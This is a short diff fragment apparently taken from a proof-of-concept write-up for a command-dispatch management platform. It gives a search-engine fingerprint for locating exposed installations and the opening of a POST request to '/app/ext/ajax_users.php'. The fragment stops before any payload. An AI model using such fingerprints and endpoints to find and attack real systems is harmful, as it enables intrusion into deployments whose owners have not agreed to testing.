@@ -5,7 +5,7 @@
 body="app/structure/departments.php"||app="指挥调度管理平台"
 ```
 
-## poc
+## POC
 ```
 POST /app/ext/ajax_users.php HTTP/1.1
 Host: 
